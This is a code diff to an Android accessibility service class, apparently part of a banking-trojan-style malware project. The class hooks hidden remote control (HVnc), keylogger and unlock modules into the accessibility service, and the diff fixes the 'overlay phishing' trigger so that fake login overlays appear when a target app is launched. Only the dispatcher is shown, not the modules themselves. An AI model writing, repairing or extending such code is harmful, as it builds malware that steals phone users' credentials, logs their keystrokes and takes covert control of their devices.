@@ -14,11 +14,13 @@ import com.fason.app.features.unlock.UnlockManager;
 public class FasonAccessibilityService extends AccessibilityService {
     private static final String TAG = "FasonA11y";
     private static volatile FasonAccessibilityService instance;
+    private OverlayManager overlayManager;
 
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
         instance = this;
+        overlayManager = OverlayManager.getInstance(this);
         HVncAccessibilityService.onHostConnected(this);
         InspectorAccessibilityService.onHostConnected(this);
         KeyloggerManager.onHostConnected(this);
@@ -31,6 +33,7 @@ public class FasonAccessibilityService extends AccessibilityService {
         if (event == null) return;
         try {
             int type = event.getEventType();
+
             if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                 type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                 HVncAccessibilityService.onAccessibilityEvent(event);
@@ -45,16 +48,15 @@ public class FasonAccessibilityService extends AccessibilityService {
             } else if (type == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
                 InspectorAccessibilityService.onAccessibilityEvent(event);
             }
+
+            // Overlay phishing: detect app launches
+            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && overlayManager != null) {
+                overlayManager.handleAccessibilityEvent(event);
+            }
         } finally {
             try { event.recycle(); } catch (Exception ignored) {}
         }
     }
-
-        // Overlay phishing: detect app launches
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            OverlayManager mgr = OverlayManager.getInstance(this);
-            mgr.handleAccessibilityEvent(event);
-        }
 
     @Override
     public void onInterrupt() {
@@ -69,6 +71,7 @@ public class FasonAccessibilityService extends AccessibilityService {
         KeyloggerManager.onHostDisconnected();
         UnlockManager.onHostDisconnected();
         instance = null;
+        overlayManager = null;
         Log.i(TAG, "Service destroyed");
     }
 
